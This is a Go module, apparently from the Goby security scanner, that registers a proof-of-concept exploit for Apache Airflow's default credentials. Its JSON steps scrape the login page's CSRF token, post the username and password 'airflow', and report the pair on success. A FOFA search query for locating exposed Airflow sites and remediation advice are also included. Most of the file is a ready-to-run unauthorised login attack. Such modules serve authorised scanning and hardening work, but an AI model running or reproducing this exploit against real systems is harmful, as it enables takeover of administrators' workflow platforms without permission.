package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Apache Airflow login Api Default Password Vulnerability",
    "Description": "Airflow is a platform created by the community to programmatically author, schedule and monitor workflows. There is a default password in airflow. Attackers can log in to the background and control the whole system.",
    "Product": "Apache Airflow",
    "Homepage": "http://airflow.incubator.apache.org",
    "DisclosureDate": "2022-04-06",
    "Author": "1276896655@qq.com",
    "FofaQuery": "title=\"Airflow\"",
    "GobyQuery": "title=\"Airflow\"",
    "Level": "2",
    "Impact": "<p>Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [
        "http://airflow.incubator.apache.org/docs/apache-airflow/stable/start/docker.html"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/login/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "csrfToken|lastbody|regex|var csrfToken = '(.*?)';"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/login/",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "csrf_token={{{csrfToken}}}&username=airflow&password=airflow"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "You should be redirected automatically to target URL: <a href=\"/\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/login/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "csrfToken|lastbody|regex|var csrfToken = '(.*?)';"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/login/",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "csrf_token={{{csrfToken}}}&username=airflow&password=airflow"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "You should be redirected automatically to target URL: <a href=\"/\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|define|text|airflow@airflow"
            ]
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "8.3",
    "Translation": {
        "CN": {
            "Name": "Apache Airflow login 接口默认口令漏洞",
            "Product": "Apache Airflow",
            "Description": "<p>Airflow 允许工作流开发人员轻松创建、维护和周期性地调度运行工作流（即有向无环图或成为DAGs）的工具。Airflow存在默认密码，攻击者可以登录后台，进而控制整个系统。<br></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。<br></p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Apache Airflow login Api Default Password Vulnerability",
            "Product": "Apache Airflow",
            "Description": "<h5><span style=\"font-size: medium;\">Airflow is a platform created by the community to programmatically author, schedule and monitor workflows.&nbsp;There is a default password in airflow. Attackers can log in to the background and control the whole system.</span></h5>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.<br></p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10708"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}